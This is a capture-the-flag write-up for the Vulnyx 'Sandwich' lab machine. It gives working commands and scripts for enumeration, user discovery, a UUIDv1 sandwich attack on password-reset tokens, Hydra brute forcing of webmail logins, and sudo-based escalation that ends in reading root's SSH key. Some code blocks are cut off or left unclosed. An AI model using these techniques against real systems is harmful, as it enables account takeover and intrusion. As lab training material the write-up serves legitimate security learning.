This writeup describes the exploitation and escalation of the Sandwich machine on the Vulnyx platform, where you can practice the sandwich technique on a password recovery form that generates UUIDs vulnerable to this technique. This technique is applicable to any insecure token or hash generated with timestamps or predictable data.

In this writeup, the IP of our attacking machine is `192.168.1.181` and the IP of our victim is `192.168.1.188`.

## Table of Contents

## Enumeration

### nmap

We perform a scan of all ports with nmap.

```bash
nmap -p- -sS -Pn -n 192.168.1.188
```

![nmap1](/assets/sandwich/nmap1.png)

We found two open ports: port 80 and 22. We performed a more thorough scan using nmap scripts to try to obtain more information about the services on both ports.

```bash
nmap -p22,80 -sCV -Pn -n 192.168.1.188
```

![nmap2](/assets/sandwich/nmap2.png)

In this second scan, we can see how the domain `sandwich.nyx` appears in the `http-title` of the website on port `80`. We add it to the `/etc/hosts` file of our machine and try to discover possible subdomains.

```bash
echo "192.168.1.188 sandwich.nyx" | sudo tee -a /etc/hosts
```

### subdomain fuzz

```bash
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u sandwich.nyx -t 30 --append-domain  
```

![subdomain fuzz](/assets/sandwich/subdomaindicobery.png)

We quickly found the subdomain `webmail.sandwich.nyx`, and we also added it to the `/etc/hosts` file.

```bash
echo "192.168.1.188 webmail.sandwich.nyx" | sudo tee -a /etc/hosts
```

### dir fuzz

We perform fuzzing of directories and files with php and txt extensions on both domains `sandwich.nyx` and `webmail.sandwich.nyx`.

#### sandwich.nyx

### Enumeración manual

We analyze all the endpoints and pages found. We observe that we can create a sort of email account at `http://webmail.sandwich.nyx`. Then, the account created in webmail can be used to register at `http://sandwich.nyx`. This allows us to save our favorite sandwiches. 🥪

### fuzz users

The user login on the website `http://sandwich.nyx` allows us to determine if a user exists or not, because even if we enter an incorrect password, the message differs depending on whether the user exists. We use this to try to find other registered users through brute force with `ffuf`. 🔍


```bash
$ ffuf -u "http://sandwich.nyx/" -X POST -d "email=FUZZ@sandwich.nyx&password=anyPassword&login_action=1" -H "Content-Type: application/x-www-form-urlencoded" -w /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -mr "Incorrect password."

We found that the user `admin@sandwich.nyx` also exists.

## Exploitation

> This writeup describes the expected exploitation. However, there is an easier way to bypass the sandwich attack, discovered by the hacker `he110wor1d`. His ingenuity deserves recognition, and you can find the detailed description in his writeup [Writeup he110wor1d](https://www.cnblogs.com/ShowMeTheBug/p/18810217).

### 🥪 Sandwich Attack 

1. We create two users on webmail.sandwich.nyx and register with those same two users on sandwich.nyx (e.g., `user1@sandwich.nyx` and `user2@sandwich.nyx`).

2. From sandwich.nyx, we select `Forgot Password` in this order (as quickly as possible):
   1. Reset password for our first user (`user1@sandwich.nyx`).
   2. Reset password for the user `admin@sandwich.nyx`.
   3. Reset password for our second user (`user2@sandwich.nyx`).
   To do it very quickly and have less "ham" in the sandwich with our users:
   ```bash
   curl -X POST http://sandwich.nyx/index.php -d "email=user1@sandwich.nyx" -d "reset_action=1" & curl -X POST http://sandwich.nyx/index.php -d "email=admin@sandwich.nyx" -d "reset_action=1" & curl -X POST http://sandwich.nyx/index.php -d "email=user2@sandwich.nyx" -d "reset_action=1"
   ```

3. We log in with our users to webmail.sandwich.nyx and obtain the two links to recover the password of our users. These links have a UUID v1 that is vulnerable to a Sandwich attack. Therefore, with the password recovery link for the user `admin@sandwich.nyx` requested between our two users, we can attempt to recover the admin password. 🔑

Webmail image for `user1@sandwich.nyx`

![alt text](/assets/sandwich/image-3.png)

Token URL for user1 and user2: 

```
http://sandwich.nyx/resetpassword.php?token=2299c1c6-09ca-11f0-8069-080027b218c8
http://sandwich.nyx/resetpassword.php?token=229e2ffe-09ca-11f0-8069-080027b218c8
```

In this URL, there is a form that, via POST, sends the token and the proposed password. If the token is valid, it changes the user's password; if the token is invalid, the message `Invalid token.` appears.

We create a Python script to generate the possible UUID v1 between the two received by our users.

These would be all the possible UUIDs V1 within the ranges. It is important to make the 3 password reset requests as quickly as possible to have a small dictionary. If the requests take too long, the dictionary can occupy GB. 📚

```python
#!/usr/bin/env python3
def generar_uuids_por_lotes(start_hex, end_hex, batch_size=100_000, output_file="uuids.txt"):
    time_mid = "09ca"
    time_hi_and_version = "11f0"
    clock_seq = "8069"
    node = "080027b218c8"

    start = int(start_hex, 16)
    end = int(end_hex, 16)

    with open(output_file, "w") as f:
        for batch_start in range(start, end + 1, batch_size):
            batch_end = min(batch_start + batch_size, end + 1)
            for time_low in range(batch_start, batch_end):
                time_low_hex = f"{time_low:08x}"
                uuid_str = f"{time_low_hex}-{time_mid}-{time_hi_and_version}-{clock_seq}-{node}"
                f.write(uuid_str + "\n")
            print(f"Lote {batch_start}-{batch_end - 1} guardado.")

# Llamada a la función
generar_uuids_por_lotes("2299c1c6", "229e2ffe")
```

We create the dictionary and use FUZZ to try to change the password of the user `admin@sandwich.nyx` to `lenam`.

```bash
$ python3 ./uuids.py
Lote 580501958-580601957 guardado.

We see that the password for three users has been changed: the UUIDs of our user that we already had and a third one that is likely for the admin user.

### Brute force on the webmail

We log in with the user `admin@sandwich.nyx` and the password `lenam` at http://sandwich.nyx.

We find the same sandwich generation and saving page, but there is also a link to download the sandwiches of all users.

![alt text](/assets/sandwich/image-4.png)

We download a CSV file with all the sandwich configurations saved by all registered users. 📥 We use this list of users to perform fuzzing on the webmail.

Since we know that to register here it is necessary to have an email at `webmail.sandwich.nyx`, we attempt to brute force with these users and the `10k-most-common.txt` wordlist on the webmail.

List of users appearing in the PDF downloaded from `sandwich.nyx`. 📋

```text
ll104567_9q@sandwich.nyx
suraxddq_tw@sandwich.nyx
xerosec_w5@sandwich.nyx
j4ckie_x5@sandwich.nyx
matthygd_x@sandwich.nyx
```

Although the list of users seems to belong to illustrious hacking masters 😉, with all due respect, we decided to venture and use Hydra with the list of users and the wordlist against the webmail.

```bash
$ hydra -L users.txt -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt webmail.sandwich.nyx http-post-form "/login.php:email=^USER^&password=^PASS^:Invalid credentials or user not found" -u -t 64 -v

```

After 7 minutes 😅, we found the password for the webmail of `matthygd_x@sandwich.nyx`.

We logged into the webmail and could see a message sent by the administrator with the password for their SSH user. 🔑

![alt text](/assets/sandwich/image-5.png)

We access with the credentials through the SSH service.

## Escalation from matthygd_xy to ll104567

```bash
$ id ; echo; cat /etc/passwd|grep sh ; echo ; sudo -l
uid=1000(matthygd_xy) gid=1000(matthygd_xy) grupos=1000(matthygd_xy),100(users)

root:x:0:0:root:/root:/bin/bash
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
matthygd_xy:x:1000:1000:,,,:/home/matthygd_xy:/bin/bash
ll104567:x:1001:1001:,,,:/home/ll104567:/bin/bash

Matching Defaults entries for matthygd_xy on sandwich:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User matthygd_xy may run the following commands on sandwich:
    (root) NOPASSWD: /bin/chvt
```

The user `matthygd_xy` can execute the binary `/bin/chvt` as root. This binary is used to switch between virtual terminals, similar to when we press CTRL+ALT+Fn.

We check if there is any TTY created by a user with `w`.

```
matthygd_xy@sandwich:~$ w
 19:38:20 up 45 min,  2 users,  load average: 0,00, 8,88, 22,24
USER     TTY      DESDE            LOGIN@   IDLE   JCPU   PCPU WHAT
ll104567 tty20    -                18:52   45:56   0.01s  0.01s -bash
matthygd pts/0    192.168.1.181    19:35    0.00s  0.01s   ?    w
```

We can observe that the user `ll104567` has an open terminal with bash, and the terminal number is `20`.

With the `chvt` command, we can display the TTY of `ll104567` on the machine's "physical" screen.

Currently, on the machine's physical screen, you can see:

![alt text](/assets/sandwich/image.png)

If we execute...

```
matthygd_xy@sandwich:~$ sudo /bin/chvt 20
```

... on the machine's "physical" screen, the TTY of `ll104567` will appear.

![alt text](/assets/sandwich/image-6.png)

At this point, we can install an SSH key for the user to access from our own terminal or continue working with the "physical screen", a reverse shell, etc.

## Escalation from ll104567 to root

The user can execute a script in /opt/game.sh with sudo.

```bash
ll104567@sandwich:~$ sudo -l
Matching Defaults entries for ll104567 on sandwich:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User ll104567 may run the following commands on sandwich:
    (ALL) NOPASSWD: /opt/game.sh

ll104567@sandwich:~$ ls -la /opt
total 12
drwxr-xr-x  2 root root 4096 mar 25 19:00 .
drwxr-xr-x 18 root root 4096 mar 22 23:05 ..
-rwxr-xr-x  1 root root 1535 mar 25 19:00 game.sh
```

The script seems to be a mathematical game; if a number is guessed, the script will return the private key of the root user.

```bash
ll104567@sandwich:~$ cat /opt/game.sh 
#!/bin/bash

export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

MAX=2000000

ATTEMPTS=$(/usr/bin/awk -v max="$MAX" 'BEGIN {printf "%d", (log(max)/log(2) + 0.999999)}')

/bin/echo "Hello! What is your name?"
read NAME

NUMBER=$(( ( RANDOM % MAX ) + 1 ))

/bin/echo "Well, $NAME, I'm thinking of a number between 1 and $MAX."
/bin/echo "You have $ATTEMPTS attempts to guess it."

ATTEMPTS_MADE=0

SECRET_FILE="/root/.ssh/id_rsa"

while [ $ATTEMPTS_MADE -lt $ATTEMPTS ]; do
  /bin/echo "Try to guess:"
  read GUESS

  # Validate that the input is a valid number
  if ! [[ "$GUESS" =~ ^[0-9]+$ ]]; then
    /bin/echo "Please, enter a valid number."
    continue
  fi

  ATTEMPTS_MADE=$((ATTEMPTS_MADE + 1))

  if [ $GUESS -lt $NUMBER ]; then
    /bin/echo "Your guess is too low."
  elif [ $GUESS -gt $NUMBER ]; then
    /bin/echo "Your guess is too high."
  else
    break
  fi
done

if [ $GUESS -eq $NUMBER ]; then
  /bin/echo "Good job, $NAME! You guessed my number in $ATTEMPTS_MADE attempts!"
  /bin/echo "Here's your reward:"
  /bin/cat "$SECRET_FILE"
else
  /bin/echo "No, the number I was thinking of was $NUMBER."
fi
```

You have a limited number of attempts to guess the number at most.

```bash
ll104567@sandwich:~$ sudo /opt/game.sh 
Hello! What is your name?
Lenam
Well, Lenam, I'm thinking of a number between 1 and 2000000.
You have 21 attempts to guess it.
Try to guess:
10
Your guess is too low.
Try to guess:
100000
Your guess is too high.
Try to guess:
```

To solve it, the binary search algorithm should be applied, which is very simple to develop and can even be answered manually.

The machine has Python installed, which will make the task easier for many, including ChatGPT.

```python
#!/usr/bin/env python3
import subprocess
import re

def enviar_linea(proc, texto):
    proc.stdin.write(texto + "\n")
    proc.stdin.flush()

def leer_hasta(proc, patron):
    """Lee línea a línea hasta encontrar una que contenga el patrón indicado."""
    salida = ""
    while True:
        linea = proc.stdout.readline()
        if not linea:
            break
        salida += linea

What remains I imagine you already know what it is, the key has no password and the root user can access via SSH to read the last flag.
